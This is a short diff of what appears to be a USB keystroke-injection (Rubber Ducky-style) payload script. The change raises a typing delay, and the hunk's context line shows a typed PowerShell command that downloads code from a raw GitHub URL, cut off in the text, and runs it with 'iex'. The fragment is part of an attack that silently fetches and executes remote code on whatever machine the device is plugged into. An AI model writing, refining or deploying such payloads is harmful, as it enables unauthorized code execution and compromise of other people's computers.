@@ -8,6 +8,6 @@ STRING iex ((New-Object System.Net.WebClient).DownloadString('https://raw.github
 ENTER
 STRING Get
 ENTER
-DELAY 500
+DELAY 1500
 STRING Open
 ENTER
